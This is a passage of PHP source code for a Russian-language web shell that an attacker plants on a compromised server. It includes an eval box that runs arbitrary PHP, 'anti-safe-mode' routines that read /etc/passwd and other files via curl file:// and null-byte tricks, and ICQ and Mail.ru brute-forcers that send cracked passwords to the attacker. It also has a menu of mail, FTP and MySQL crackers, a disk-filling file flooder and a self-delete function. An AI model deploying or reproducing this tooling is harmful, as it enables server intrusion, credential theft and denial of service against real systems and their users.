$con = str_replace("href=\'http","HrEf=\"".hlink("sec=px&url=http"),$con);

$con = str_replace("HREF=\'http","HrEf=\"".hlink("sec=px&url=http"),$con);

$con = str_replace("href=http","HrEf=".hlink("sec=px&url=http"),$con);

$con = str_replace("HREF=http","HrEf=".hlink("sec=px&url=http"),$con);

$con = str_replace("href=\"","HrEf=\"".hlink("sec=px&url=http://$host/$dir/"),$con);

$con = str_replace("HREF=\"","HrEf=\"".hlink("sec=px&url=http://$host/$dir/"),$con);

$con = str_replace("href=\"","HrEf=\'".hlink("sec=px&url=http://$host/$dir/"),$con);

$con = str_replace("HREF=\"","HrEf=\'".hlink("sec=px&url=http://$host/$dir/"),$con);

$con = str_replace("href=","HrEf=".hlink("sec=px&url=http://$host/$dir/"),$con);

$con = str_replace("HREF=","HrEf=".hlink("sec=px&url=http://$host/$dir/"),$con);

echo $con;

}

fclose($url);

}

}

function phpeval(){

global $t,$hcwd;

if (!empty($_REQUEST['code'])){

echo "<center><textarea rows=\"10\" cols=\"64\">";

ob_start();

eval($_REQUEST['code']);

$evalute=ob_get_contents();

ob_end_clean();

echo htmlspecialchars($evalute);

echo "</textarea></center><br>";

}

echo "<center>${t}Evaler:</td><td></td></tr><form method=\"POST\"><tr><td width=\"20%\">Код:</td><td><textarea rows=\"10\" name=\"code\" cols=\"64\">";

if(!empty($_REQUEST['code'])) echo htmlspecialchars($_REQUEST['code']);

echo "</textarea></td></tr><tr><td width=\"20%\"></td><td align=right>$hcwd<input class=buttons type=submit value=Выполнить></td></tr></form></table></center>";

}

function whois(){

global $t,$hcwd;

if (!empty($_REQUEST['server']) && !empty($_REQUEST['domain'])){

$server =$_REQUEST['server'];

$domain=$_REQUEST['domain']."\r\n";

$ser=fsockopen($server,43,$en,$es,5);

fputs($ser,$domain);

echo "<pre>";

while(!feof($ser)) echo fgets($ser);

echo "</pre>";

fclose($ser);

}

else{

echo "<center>${t}Whois:</td><td></td></tr><form method=\"POST\"><tr><td width=\"20%\">Сервер:</td><td><input type=text value=\"";

if (!empty($_REQUEST['server'])) echo htmlspecialchars($_REQUEST['server']);

else echo "whois.geektools.com";

echo "\" name=server size=35></td></tr><tr><td width=\"20%\">Домен/IP:</td><td><input type=text name=domain value=\"";

if (!empty($_REQUEST['domain'])) echo htmlspecialchars($_REQUEST['domain']);

else echo "google.com";

echo "\" size=35></td><tr><td></td><td align=right>$hcwd<input class=buttons type=submit value=\"&gt;&gt;\"></td></tr></form></table></center>";

}

}

function hexview(){

if (!empty($_REQUEST['file'])){

$f = $_REQUEST['file'];

echo "<table border=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"100%\"><td width=\"10%\">Offset</td><td width=\"25%\">Hex</td><td width=\"25%\"></td><td width=\"40%\">ASCII</td></tr>";

$file = fopen($f,"r");

$i= -1;

while (!feof($file)) {

$ln='';

$i++;

echo "<tr><td width=\"10%\" bgcolor=\"#";

if ($i % 2==0) echo "666666"; else echo "808080";

echo "\">"; echo str_repeat("0",(8-strlen($i * 16))).$i * 16; echo "</td>";

echo "<td width=\"25%\" bgcolor=\"#";

if ($i % 2==0) echo "666666"; else echo "808080"; 

echo "\">";

for ($j=0;$j<=7;$j++){

if (!feof($file)){

$tmp = strtoupper(dechex(ord(fgetc($file))));

if (strlen($tmp)==1) $tmp = "0".$tmp;

echo $tmp." ";

$ln.=$tmp;

}

}

echo "</td><td width=\"25%\" bgcolor=\"#";

if ($i % 2==0) echo "666666"; else echo "808080"; 

echo "\">";

for ($j=7;$j<=14;$j++){

if (!feof($file)){

$tmp = strtoupper(dechex(ord(fgetc($file))));

if (strlen($tmp)==1) $tmp = "0".$tmp;

echo $tmp." ";

$ln.=$tmp;

}

}

echo "</td><td width=\"40%\" bgcolor=\"#";

if ($i % 2==0) echo "666666"; else echo "808080";

echo "\">";

$n=0;$asc="";$co=0;

for ($k=0;$k<=16;$k++){

$co=hexdec(substr($ln,$n,2));

if (($co<=31)||(($co>=127)&&($co<=160)))$co=46;

$asc.= chr($co);

$n+=2;

}

echo htmlspecialchars($asc);

echo "</td></tr>";

}

}

fclose($file);

echo "</table>";

}



function safemode(){

global $windows,$t,$hcwd;

if (!empty($_REQUEST['file'])){

$i=1;

echo "<pre>\n<font color=green>Метод $i:(ini_restore)</font><font color=blue>\n";

ini_restore("safe_mode");ini_restore("open_basedir");

$tmp = file_get_contents($_REQUEST['file']);

echo htmlspecialchars($tmp);

$i++;

echo "\n</font><font color=green>Метод $i:(copy)</font><font color=blue>\n";

$tmp=tempnam("","cx");

copy("compress.zlib://".$_REQUEST['file'], $tmp);

$fh = fopen($tmp, "r");

$data = fread($fh, filesize($tmp));

fclose($fh);

echo htmlspecialchars($data);

$i++;

if(function_exists("curl_init")){

echo "\n</font><font color=green>Метод $i:(curl_init)[A]</font><font color=blue>\n";

$fh = @curl_init("file://".$_REQUEST['file']."");

$tmp = @curl_exec($fh);

echo $tmp;

$i++;

echo "\n</font><font color=green>Метод $i:(curl_init)[B]</font><font color=blue>\n";

$i++;

if(strstr($_REQUEST['file'],DIRECTORY_SEPARATOR))

$ch =curl_init("file:///".$_REQUEST['file']."\x00/../../../../../../../../../../../../".__FILE__);

else $ch = curl_init("file://".$_REQUEST['file']."\x00".__FILE__);

curl_exec($ch);

var_dump(curl_exec($ch));

}

if($_REQUEST['file'] == "/etc/passwd"){

echo "\n</font><font color=green>Метод $i:(posix)</font><font color=blue>\n";

for($uid=0;$uid<99999;$uid++){

$h = posix_getpwuid($uid);

if (!empty($h))while (list ($k, $v) = each($h))echo "$v:";}}

$i++;

echo "</pre></font>";

}

echo "<center>${t}АнтиБезопасный режим:</td><td></td></tr><form method=\"POST\"><tr><td width=\"20%\">Файл:</td><td><input type=text value=\"";if (!empty($_REQUEST['file'])) echo htmlspecialchars($_REQUEST['file']);elseif(!$windows) echo "/etc/passwd"; echo "\" name=file size=35></td></tr><tr><td></td><td align=right>$hcwd<input class=buttons type=submit value=\"Прочитать\"></td></tr></form></table></center>";

}

function icqlogin($login,$pass) {

$icq = new ICQclient($login,$pass);

if($icq->connect()) { 

if ($icq->login()) {

if (!empty($_REQUEST['admin']) && isset($_REQUEST['admin'])) {

$icq->send_message($_REQUEST['admin'],"Сбручен #:\r\n".$login.";".$pass."\r\nEugen Shell Brutter");

}

usleep(100);

return true;

}}

return false;

}

function icqbrute() {

global $msgbox,$et;

if (!isset($_REQUEST['ibr']) || empty ($_REQUEST['ibr'])) {

echo $msgbox."<form action=\"".$_SERVER['PHP_SELF']."?sec=icq&workingdir=".getcwd()."\" method=post>Введите номера в виде номер;пароль на строку.<br><textarea rows=20 cols=50 name=ibr></textarea><br><br>Путь к файлу для сохранения хороших комбинаций.<br>Если не существует - будет создан. Иначе - перезаписан.<br>Поле можно оставить пустым.<br>Файл: <input type=text name=icqfile><br>Ваш номер (На него прийдут результаты. Можно оставить пустым.):<br><input type=text name=admin><br><input type=submit value=Старт></form><br>".$et;

} else {

$filegood=$_REQUEST['icqfile'];

if (!empty($filegood)) {

$fp=@fopen($filegood,"w+");

$nums=$_REQUEST['ibr'];

$arr=explode("\r\n",$nums);

echo "<meta http-equiv='refresh' content='0; URL=".$_SERVER['PHP_SELF']."'>\r\n<script>location.href='".$_SERVER['PHP_SELF']."'</script><a href='".$_SERVER['PHP_SELF']."'>Нажмите сюда</a>";

flusher();

for ($i=0; $i<count($arr); $i++) {

list($uin,$password)=explode(";",$arr[$i]);

if (icqlogin($uin,$password)) { fputs($fp,$uin.";".$password."\r\n"); } else {

if (icqlogin($uin,$password)) { fputs($fp,$uin.";".$password."\r\n"); }

}

}

fclose($fp);

} else {

$nums=$_REQUEST['ibr'];

$arr=explode("\r\n",$nums);

echo $msgbox."<br>Сбрученные номера<br>";

flusher();

for ($i=0; $i<count($arr); $i++) {

list($uin,$password)=explode(";",$arr[$i]);

if (!!icqlogin($uin,$password)) {

echo $uin.";".$password."<br>";

flusher();

}}

echo $et;

}}}

function mralogin($login,$pass) {

$user_agent = 'magent';

$magic = "\xEF\xBE\xAD\xDE";

$proto = "\x0A\x00\x01\x00";

$mnumb = 0;

$socket = @fsockopen("mrim.mail.ru","2042");

if (!$socket) { return false; }

$answ=fgets($socket, 20);

fclose ($socket);

list($hostc, $portc) = explode(":", $answ);

unset ($socket);

unset ($answ);

$socket = @fsockopen($hostc,$portc);

if (!$socket) { return false; }

$mrim_hello = $magic.$proto.pack("L1", $mnumb)."\x01\x10\x00\x00"."\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

fputs($socket,$mrim_hello);

$mnumb++;

$answ=fgets($socket, 48);

$ping_time = ord(unpack("x44 A1", $answ));

unset($answ);

$login_data = pack('L1',strlen($login)).$login.pack('L1',strlen($pass)).$pass."\x01\x00\x00\x00".pack('L1',strlen($user_agent)).$user_agent;

$mrim_login = $magic.$proto.pack("L1", $mnumb)."\x38\x10\x00\x00".pack('L1',strlen($login_data))."\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".$login_data;

fputs($socket,$mrim_login);

$answ=fread($socket, 1024);

$mnumb++;

if (!strstr($answ,"Invalid login") && !empty($answ) && !strstr($answ,"Access denied")) {

if (!empty($_REQUEST['sendto'])) {

$to=$_REQUEST['sendto'];

$text="Сбручен ящик ".$login."\r\nПароль: ".$pass;

$data = "\x04\x00\x00\x00".pack ('L1', strlen($to)).$to.pack ('L1', strlen($text)).$text.pack ('L1', '0');

$mrim_packet = $magic.$proto.pack("L1", $mnumb)."\x08\x10\x00\x00".pack('L1',strlen($data))."\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".$data;

fputs($socket,$mrim_packet);

}

return true;

} else {

return false;

}

unset ($answ);

fclose($socket);

}

function mrabrute(){

global $msgbox,$et;

if (!isset($_REQUEST['mbr']) || empty ($_REQUEST['mbr'])) {

echo $msgbox."<form action=\"".$_SERVER['PHP_SELF']."?sec=mbr&workingdir=".getcwd()."\" method=post>Введите ящики в виде ящик:пароль на строку.<br><textarea rows=20 cols=50 name=mbr></textarea><br><br>Путь к файлу для сохранения хороших комбинаций.<br>Если не существует - будет создан. Иначе - перезаписан.<br>Поле можно оставить пустым.<br>Файл: <input type=text name=mrafile><br>Ваш ящик агента (должна стоять галочка \"принимать сообщения от всех\")<br>(На него прийдут результаты. Можно оставить пустым.):<br><input type=text name=sendto><br><input type=submit value=Старт></form><br>".$et;

} else {

$filegood=$_REQUEST['mrafile'];

if (!empty($filegood)) {

$fp=@fopen($filegood,"w+");

$nums=$_REQUEST['mbr'];

$arr=explode("\r\n",$nums);

echo "<meta http-equiv='refresh' content='0; URL=".$_SERVER['PHP_SELF']."'>\r\n<script>location.href='".$_SERVER['PHP_SELF']."'</script><a href='".$_SERVER['PHP_SELF']."'>Нажмите сюда</a>";

flusher();

for ($i=0; $i<count($arr); $i++) {

list($mail,$password)=explode(":",$arr[$i]);

if (mralogin($mail,$password)) { fputs($fp,$mail.":".$password."\r\n"); }

}

fclose($fp);

} else {

$nums=$_REQUEST['mbr'];

$arr=explode("\r\n",$nums);

echo $msgbox."<br>Сбрученные ящики<br>";

flusher();

for ($i=0; $i<count($arr); $i++) {

list($mail,$password)=explode(":",$arr[$i]);

if (mralogin($mail,$password)) {

echo $mail.":".$password."<br>";

flusher();

}}

echo $et;

}}

}

function cracker(){

global $et;

$cwd = getcwd();

echo "<center><table border=0><tr><td><a href=\"".hlink("sec=hc&workingdir=$cwd")."\">[Hash]</a> - <a href=\"".hlink("sec=smtp&workingdir=$cwd")."\">[SMTP]</a> - <a href=\"".hlink("sec=pop3&workingdir=$cwd")."\">[POP3]</a> - <a href=\"".hlink("sec=imap&workingdir=$cwd")."\">[IMAP]</a> - <a href=\"".hlink("sec=ftp&workingdir=$cwd")."\">[FTP]</a> - <a href=\"".hlink("sec=snmp&workingdir=$cwd")."\">[SNMP]</a> - <a href=\"".hlink("sec=sql&workingdir=$cwd")."\">[MySQL]</a> - <a href=\"".hlink("sec=fcr&workingdir=$cwd")."\">[HTTP форма]</a> - <a href=\"".hlink("sec=auth&workingdir=$cwd")."\">[HTTP авторизация (basic)]</a> - <a href=\"".hlink("sec=code&workingdir=$cwd")."\">[Шифровка и дешивровка текста]</a> - <a href=\"".hlink("sec=icq&workingdir=$cwd")."\">[ICQ брут]</a> - <a href=\"".hlink("sec=mbr&workingdir=$cwd")."\">[MRA брут]</a> - <a href=\"".hlink("sec=dic&workingdir=$cwd")."\">[Генератор словарей]</a>$et</center>";

}

function tools(){

global $et;

$cwd = getcwd();

echo "<center><table border=0><tr><td><a href=\"".hlink("sec=http&workingdir=$cwd")."\">[InetCrack (HTTP)]</a> - <a href=\"".hlink("sec=fflooder&workingdir=$cwd")."\">[Файловый флудер]</a> - <a href=\"".hlink("sec=prc&workingdir=$cwd")."\">[Прокси-чекер]</a> - <a href=\"".hlink("sec=whois&workingdir=$cwd")."\">[Whois]</a> - <a href=\"".hlink("sec=cryptphp&workingdir=$cwd")."\">[PHP криптор]</a> - <a href=\"".hlink("sec=calc&workingdir=$cwd")."\">[Convert]</a> - <a href=\"".hlink("sec=hash&workingdir=$cwd")."\">[Hash Calc]</a> - <a href=\"".hlink("sec=selfremove&workingdir=.")."\">[Самоудаление]</a>$et</center>";

}

function asc2bin($str) { 

$text_array = explode("\r\n", chunk_split($str, 1)); 

for ($n = 0; $n < count($text_array) - 1; $n++) { 

$newstring .= substr("0000".base_convert(ord($text_array[$n]), 10, 2), -8); 

} 

$newstring = chunk_split($newstring, 8, " "); 

return $newstring; 

} 

function bin2asc($str) { 

$str = str_replace(" ", "", $str); 

$text_array = explode("\r\n", chunk_split($str, 8)); 

for ($n = 0; $n < count($text_array) - 1; $n++) { 

$newstring .= chr(base_convert($text_array[$n], 2, 10)); 

} 

return $newstring; 

} 

function asc2hex($str) { 

return chunk_split(bin2hex($str), 2, " "); 

} 

function hex2asc($str) { 

$str = str_replace(" ", "", $str); 

for ($n=0; $n<strlen($str); $n+=2) { 

$newstring .=  pack("C", hexdec(substr($str, $n, 2))); 

} 

return $newstring; 

} 

function binary2hex($str) { 

$str = str_replace(" ", "", $str); 

$text_array = explode("\r\n", chunk_split($str, 8)); 

for ($n = 0; $n < count($text_array) - 1; $n++) { 

$newstring .= str_pad(base_convert($text_array[$n], 2, 16), 2, "0", STR_PAD_LEFT); 

} 

$newstring = chunk_split($newstring, 2, " "); 

return $newstring; 

} 

function hex2binary($str) { 

$str = str_replace(" ", "", $str); 

$text_array = explode("\r\n", chunk_split($str, 2)); 

for ($n = 0; $n < count($text_array) - 1; $n++) { 

$newstring .= substr("0000".base_convert($text_array[$n], 16, 2), -8); 

} 

$newstring = chunk_split($newstring, 8, " "); 

return $newstring; 

} 

function caesarbf($str) { 

$alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; 

echo "<table width=\"85%\" cellpadding=\"2\" align=\"center\">\n"; 

for ($n = 1; $n < 26; $n++) { 

$cipher = substr($alpha, $n, 26 - $n) . substr($alpha, 0, $n) . substr($alpha, 26+$n, 52-$n) . substr($alpha, 26, $n); 

if ($n % 2 == 0) { 

echo '<tr bgcolor="#eeeeee">'; 

} else { 

echo '<tr bgcolor="#cccccc">'; 

} 

echo "<td>ROT-$n: ". strtr($str, $alpha, $cipher) ."</td>"; 

} 

echo "<tr>\n"; 

echo "</table>\n"; 

} 

function entityenc($str) { 

$text_array = explode("\r\n", chunk_split($str, 1)); 

for ($n = 0; $n < count($text_array) - 1; $n++) { 

$newstring .= "&#" . ord($text_array[$n]) . ";"; 

} 

return $newstring; 

} 

function entitydec($str) { 

$str = str_replace(';', '; ', $str); 

$text_array = explode(' ', $str); 

for ($n = 0; $n < count($text_array) - 1; $n++) { 

$newstring .= chr(substr($text_array[$n], 2, 3)); 

} 

return $newstring; 

} 

function l33t($str) { 

$from = 'ieastoIEASTO'; 

$to = '134570134570'; 

$newstring = strtr($str, $from, $to); 

return $newstring; 

} 

function del33t($str) { 

$from = '134570'; 

$to = 'ieasto'; 

$newstring = strtr($str, $from, $to); 

return $newstring; 

} 

function igpay($str) { 

$text_array = explode(" ", $str); 

for ($n = 0; $n < count($text_array); $n++) { 

$newstring .= substr($text_array[$n], 1) . substr($text_array[$n], 0, 1) . "ay "; 

} 

return $newstring; 

} 

function unigpay($str) { 

$text_array = explode(" ", $str); 

for ($n = 0; $n < count($text_array); $n++) { 

$newstring .= substr($text_array[$n], -3, 1) . substr($text_array[$n], 0, strlen($text_array[$n]) - 3) . " "; 

} 

return $newstring; 

} 

function rot13($str) { 

$from = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; 

$to   = 'nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM'; 

$newstring = strtr($str, $from, $to); 

return $newstring; 

} 

function strip_spaces($str) { 

$str = str_replace(" ", "", $str); 

return $str; 

} 

function code() {

global $et;

$cwd = getcwd();

echo "<center><table border=0><tr><td>";

if(isset($_REQUEST['submit'])) { 

$text = $_REQUEST['text']; 

if($text == '') { 

die("<p>Заполните форму!</p>\n"); 

} 

$text = urldecode(stripslashes($text)); 

$orig_text = $text; 

$orig_text = htmlentities($orig_text); 

echo("<p>$orig_text<br>конвертируется в:<br>\n"); 

switch ($_POST['cryptmethod']) { 

case "asc2bin": 

$text = asc2bin($text); 

break; 

case "asc2hex": 

$text = asc2hex($text); 

break; 

case "bin2asc": 

$text = bin2asc($text); 

break; 

case "hex2asc": 

$text = hex2asc($text); 

break; 

case "bin2hex": 

$text = binary2hex($text); 

break; 

case "hex2bin": 

$text = hex2binary($text); 

break; 

case "backwards": 

$text = strrev($text); 

break; 

case 'b64enc': 

$text = base64_encode($text); 

break; 

case 'b64dec': 

$text = base64_decode(strip_spaces($text)); 

break; 

case 'caesarbf': 

$text = caesarbf($text); 

break; 

case 'crypt': 

$text = crypt($text, 'CRYPT_STD_DES'); 

break; 

case 'entityenc': 

$text = entityenc($text); 

break; 

case 'entitydec': 

$text = entitydec($text); 

break; 

case "l33t": 

$text = l33t($text); 

break; 

case "del33t": 

$text = del33t($text); 

break; 

case 'md5': 

$text = md5($text); 

break; 

case 'igpay': 

$text = igpay($text); 

break; 

case 'unigpay': 

$text = unigpay($text); 

break; 

case "rot-13": 

$text = rot13($text); 

break; 

case 'urlenc': 

$text = urlencode($text); 

break; 

case 'urldec': 

$text = urldecode($text); 

break; 

default: 

die("Тип не поддерживается!</p>\n"); 

}

$text = htmlentities($text); 

echo("$text</p>\n"); 

}

$form="<form action=\"".hlink("sec=hash&workingdir=$cwd")."\" method=\"post\"> 

<textarea name=\"text\" rows=\"5\" cols=\"50\">";

if (isset($orig_text)) { $form.=$orig_text; }

$form.="</textarea><br /> 

<select name=\"cryptmethod\"> 

<option value=\"asc2bin\">ASCII to Binary</option> 

<option value=\"bin2asc\">Binary to ASCII</option> 

<option value=\"asc2hex\">ASCII to Hex</option> 

<option value=\"hex2asc\">Hex to ASCII</option> 

<option value=\"bin2hex\">Binary to Hex</option> 

<option value=\"hex2bin\">Hex to Binary</option> 

<option value=\"backwards\">Backwards</option> 

<option value=\"b64enc\">Base 64 Encode</option> 

<option value=\"b64dec\">Base 64 Decode</option> 

<option value=\"caesarbf\">Caesar Bruteforce</option> 

<option value=\"crypt\">DES Crypt (one way)</option> 

<option value=\"entityenc\">HTML Entities Encode</option> 

<option value=\"entitydec\">HTML Entities Decode</option> 

<option value=\"l33t\">l33t 5p34k 3nc0d3</option> 

<option value=\"del33t\">l33t 5p34k d3c0d3</option> 

<option value=\"md5\">MD5 Crypt (one way)</option> 

<option value=\"igpay\">Igpay Atinlay</option> 

<option value=\"unigpay\">Un-Pig Latin</option> 

<option value=\"rot-13\">ROT-13</option> 

<option value=\"urlenc\">URL Encode</option> 

<option value=\"urldec\">URL Decode</option> 

</select><br /> 

<input type=\"submit\" name=\"submit\" value=\"OK\" /> 

<input type=\"reset\" value=\"Очистить\" /> 

</form>";

echo $form.$et;

}

function http() {

global $et;

$cwd = getcwd();

echo "<center><table border=0><tr><td>\r\n";

?>

<script>

function format() {

var ff=document.forms.item('form');

host=ff.host.value;

path=ff.path.value;

method=ff.method.value;

vars=ff.vars.value;

cookies=ff.cookies.value;

agent=ff.agent.value;

referer=ff.referer.value;

xff=ff.xff.value;

document.main.host.value=host;

if (method == 'GET') {

f='GET '+path+'?'+vars+' HTTP/1.1\r\n';

} else {

f='POST '+path+' HTTP/1.1\r\n';

}

f+='Accept: */*\r\n';

f+='Accept-Language: ru\r\n';

f+='Accept-Encoding: gzip\r\n';

if (referer != '') {

f+='Referer: '+referer+'\r\n';

}

if (method == 'POST') {

f+='Content-Type: application/x-www-form-urlencoded\r\n';

f+='Content-Length: '+vars.length+'\r\n';

}

if (xff != '') {

f+='X-Forwarded-For: '+xff+'\r\n';

}

f+='User-Agent: '+agent+'\r\n';

f+='Host: '+host+'\r\n';

if (cookies != '') {

f+='Cookie: '+cookies+'\r\n';

}

f+='Connection: Keep-Alive\r\n';

if (method == 'POST') {

if (vars == '') {

f+='\r\n';

} else {

f+='\r\n'+vars;

}

} else {

f+='\r\n';

}

document.main.pac.value=f;

}

</script>

<noscript><center><h2>Включите JavaScript для нормальной работы скрипта</h2></center></noscript>

<h3>Формирование запроса</h3>

<form name="form" action="javascript://" onSubmit="format();" onClick="format();" onKeyPress="format();">

<table width="500">

<tr>

<td>Хост:</td><td><input type="text" name="host" value="site.ru" onChange="format();" size="50" /></td>

</tr>

<tr>

<td>Путь:</td><td><input type="text" name="path" value="/index.php" onChange="format();" size="50" /></td>

</tr>

<tr>

<td>Метод:</td><td><input type="radio" name="met" value="GET" checked="checked" onClick="document.form.method.value='GET';" /> GET <input type="radio" name="met" value="POST" onClick="document.form.method.value='POST';" /> POST<input type="hidden" name="method" value="GET" /></td>

</tr>

<tr>

<td>Переменные:</td><td><input type="text" name="vars" onChange="format();" size="50" /></td>

</tr>

<tr>

<td>Cookies:</td><td><input type="text" name="cookies" onChange="format();" size="50" /></td>

</tr>

<tr>

<td>User-Agent:</td><td><input type="text" name="agent" value="Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" onChange="format();" size="50" /></td>

</tr>

<tr>

<td>Referer:</td><td><input type="text" name="referer" onChange="format();" size="50" /></td>

</tr>

<tr>

<td>X-Forwarded-For:</td><td><input type="text" name="xff" onChange="format();" size="50" /></td>

</tr>

<tr>

<td>&nbsp;</td><td><input type="submit" value="Сформировать запрос" /></td>

</tr>

</table>

</form>

<form name="main" action="<?=hlink("sec=http&workingdir=$cwd"); ?>&send=1" method="post">

Хост:<br />

<input type="text" name="host" value="" /><br />

Запрос:<br />

<textarea name="pac" rows="10" cols="50"></textarea><br />

Добавлять htmlspecialchars() к ответу сервера<br />(для ламеров - выводить ответ в виде текста, а не HTML) <input type="checkbox" checked="checked" name="hsc" /><br />

<input type="submit" value="Послать пакет" />

</form>

<?

if ($_GET['send'] == '1' && !empty($_POST['host']) && !empty($_POST['pac'])) {

echo "<br><br>Ответ сервера:<br><hr>";

list($host,$port)=explode(":",$_POST['host']);

if (!isset($port) or empty($port)) {

unset($port);

$port=80;

}

if (!$socket=@fsockopen($host,$port,$en,$es,"3")) {

echo "<h2>Нет связи с сервером!</h2>";

exit();

}

fputs($socket,stripslashes($_POST['pac']));

$get="";

while (!feof($socket)) { $get.=fgets($socket,32); }

fclose($socket);

if (isset($_POST['hsc'])) { $get=htmlspecialchars($get); }

$get=nl2br($get);

echo "<br>\r\n<div style=\"margin: 0px;padding: 7px;border: 1px inset;width: 640px;height: 480px;overflow: auto;background-color: #C0C0C0;color: #000000\">";

echo $get."\r\n";

echo "</div>\r\n";

echo "<hr>\r\n";

}

echo $et."</center>";

}

function fflooder() {

global $et;

$cwd = getcwd();

echo "<center><table border=0><tr><td>\r\n";

if (!isset($_REQUEST['confirm'])) {

echo "<script>

if (confirm('Файловый флудер. Точно хотите забить папку сгенерированными файлами?')) {

location.href='".hlink("sec=fflooder&workingdir=$cwd&confirm=1")."';

}

</script>$et";

}

if (isset($_REQUEST['confirm'])) {

$name = array('a','b','c','d','e','f','g','h','i','j','k',    'l','m','n','o','p','r','s',

  't','u','v','x','y','z','A','B','C','D','E','F','G    ','H','I','J','K','L',

  'M','N','O','P','R','S','T','U','V','X','Y','Z','1    ','2','3','4','5','6',

  '7','8','9','0');

$rash= array('.txt','.dic','.doc','.xls','.exe','.ini',

 '.bat','.log','.dll','.hak','.wmf','.zip','.rar',

 '.tar','.gz','.jpg','.gif','.bmp');

while(true) {

$perem = "";

$fuck="";

for($i = 0; $i < rand(20,1); $i++)

{

$by = rand(0, count($name) - 1);

$perem .= $name[$by];

}

$ra= rand(0, count($rash)-1);

$fuck .= $rash[$ra];

$fp=fopen($perem.$fuck,"w");

fwrite($fp,str_repeat(php_uname(),20));

fclose($fp);

}

}

}

function selfremove() {

global $et;

echo "<center><table border=0><tr><td>\r\n";

if (!isset($_REQUEST['confirm'])) {

echo "<script>

if (confirm('Вы уверены, что хотите удалить меня? :\'(')) {

location.href='".hlink("sec=selfremove&confirm=1")."';

}

</script>$et";

}

if (isset($_REQUEST['confirm'])) {

unlink($_SERVER['SCRIPT_FILENAME']);

echo "<script>alert('Готово!');</script>";

}

}

function dicmaker(){

global $errorbox,$windows,$footer,$t,$et,$hcwd;

if (!empty($_REQUEST['combo'])&&($_REQUEST['combo']==1)) $combo=1 ; else $combo=0;

if (!empty($_REQUEST['range']) && !empty($_REQUEST['output']) && !empty($_REQUEST['min']) && !empty($_REQUEST['max'])){

$min = $_REQUEST['min'];

$max = $_REQUEST['max'];

if($max<$min)die($errorbox ."Неверный ввод!$et". $footer);

$s =$w="";

$out = $_REQUEST['output'];

$r = ($_REQUEST['range']=='a' )?'a':'A';

if ($_REQUEST['range']==0) $r=0;

for($i=0;$i<$min;$i++) $s.=$r;

$dic = fopen($out,'a');

if(is_nan($r)){

while(strlen($s)<=$max){

$w = $s;

if($combo)$w="$w:$w";

fwrite($dic,$w."\n");

$s++;}

}

else{

while(strlen($w)<=$max){

$w =(string)str_repeat("0",($min - strlen($s))).$s;

if($combo)$w="$w:$w";

fwrite($dic,$w."\n");

$s++;}

}

fclose($dic);

echo "<font color=blue>Готово!</font>";

}

if (!empty($_REQUEST['input']) && !empty($_REQUEST['output'])){

$input=fopen($_REQUEST['input'],'r');

if (!$input){

if ($windows)echo $errorbox. "Невозможно считать с ".htmlspecialchars($_REQUEST['input']) ."$et<br>";

else{

$input=explode("\n",shell("cat $input"));

$output=fopen($_REQUEST['output'],'w');

if ($output){

foreach ($input as $in){

$user = $in;

$user = trim(fgets($in)," \n\r");

if (!strstr($user,":"))continue;

$user=substr($user,0,(strpos($user,':')));

if($combo) fwrite($output,$user.":".$user."\n"); else fwrite($output,$user."\n");

}

fclose($input);fclose($output);

echo "<font color=blue>Готово!</font>";

}

}

}

else{

$output=fopen($_REQUEST['output'],'w');

if ($output){

while (!feof($input)){

$user = trim(fgets($input)," \n\r");

if (!strstr($user,":"))continue;

$user=substr($user,0,(strpos($user,':')));

if($combo) fwrite($output,$user.":".$user."\n"); else fwrite($output,$user."\n");

}

fclose($input);fclose($output);

echo "<font color=blue>Готово!</font>";

}

else echo $errorbox." Невозможно записать в ".htmlspecialchars($_REQUEST['input']) ."$et<br>";

}

}elseif (!empty($_REQUEST['url']) && !empty($_REQUEST['output'])){

$res=downloadit($_REQUEST['url'],$_REQUEST['output']);

if($combo && $res){

$file=file($_REQUEST['output']);

$output=fopen($_REQUEST['output'],'w');

foreach ($file as $v)fwrite($output,"$v:$v\n");

fclose($output);

}

echo "<font color=blue>Готово!</font>";

}else{

$temp=whereistmp();

echo "<center>${t}Генератор слов:</td><td></td></tr><form method=\"POST\"><tr><td width=\"20%\">Промежуток:</td><td><select name=range><option value=a>a-z</option><option value=Z>A-Z</option><option value=0>0-9</option></select></td></tr><tr><td width=\"20%\">Мин. длина:</td><td><select name=min><option value=1>1</option><option value=2>2</option><option value=3>3</option><option value=4>4</option><option value=5>5</option><option value=6>6</option><option value=7>7</option><option value=8>8</option><option value=9>9</option><option value=10>10</option></select></td></tr><tr><td width=\"20%\">Макс. длина:</td><td><select name=max><option value=2>2</option><option value=3>3</option><option value=4>4</option><option value=5>5</option><option value=6>6</option><option value=7>7</option><option value=8 selected>8</option><option value=9>9</option><option value=10>10</option><option value=11>11</option><option value=12>12</option><option value=13>13</option><option value=14>14</option><option value=15>15</option></select></td></tr><tr><td width=\"20%\">Сохранить в:</td><td><input type=text value=\"$temp/.dic\" name=output size=35></td></tr><tr><td width=\"20%\"></td><td><input type=checkbox name=combo style=\"border-width:1px;background-color:#666666;\" value=1 checked>Вывод в Combo-стиле</td></tr><td></td><td align=right>$hcwd<input class=buttons type=submit value=Создать></td></tr></form></table><br>${t}Сграбить словарь:</td><td></td></tr><form method=\"POST\"><tr><td width=\"20%\">Откуда:</td><td><input type=text value=\"/etc/passwd\" name=input size=35></td></tr><tr><td width=\"20%\">Сохранить в:</td><td><input type=text value=\"$temp/.dic\" name=output size=35></td></tr><tr><td width=\"20%\"></td><td><input type=checkbox style=\"border-width:1px;background-color:#666666;\" name=combo value=1 checked>Вывод в Combo-стиле</td></tr><td></td><td align=right>$hcwd<input class=buttons type=submit value=Сграбить></td></tr></form></table><br>${t}Загрузить словарь:</td><td></td></tr><form method=\"POST\"><tr><td width=\"20%\">URL:</td><td><input type=text 